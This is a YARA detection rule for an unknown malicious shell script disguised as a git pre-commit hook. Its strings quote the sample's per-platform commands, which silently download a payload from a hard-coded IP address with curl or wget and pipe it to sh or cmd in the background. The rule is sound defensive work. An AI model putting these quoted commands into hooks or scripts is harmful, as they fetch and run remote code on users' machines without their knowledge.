rule SCRIPT_Sample_Unique_9522e6bf
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "9522e6bf4b6291f15acfff7b7340434309e0e4ae3855f717d7a0ffce5a126c24"
        yarahub_uuid = "202874d4-893a-4b38-9077-3e97d3ecae78"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "8ca3221050b78e4fd9ffd2730fd6b1d1"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "Custom curl command for pre-commit hook" ascii
        $s1 = "darwin*)  curl -s 'http://84.200.33.163/302/302m' -L | sh  > /dev/null 2>&1 &;;" ascii
        $s2 = "linux*)   wget -qO- 'http://84.200.33.163/302/302l' -L | sh  > /dev/null 2>&1 &;;" ascii
        $s3 = "msys*)    curl -s http://84.200.33.163/302/302w -L | cmd  > /dev/null 2>&1 &;;" ascii
        $s4 = "cygwin*)  curl -s http://84.200.33.163/302/302w -L | cmd  > /dev/null 2>&1 &;;" ascii
        $s5 = "*)        curl -s 'http://84.200.33.163/302/302m' -L | sh  > /dev/null 2>&1 &;;" ascii
        $s6 = "http://84.200.33.163/302/302m" ascii
        $s7 = "http://84.200.33.163/302/302l" ascii
    condition:
        true and filesize < 50MB and 3 of them and 1 of ($s0, $s1, $s2, $s3, $s4)
}
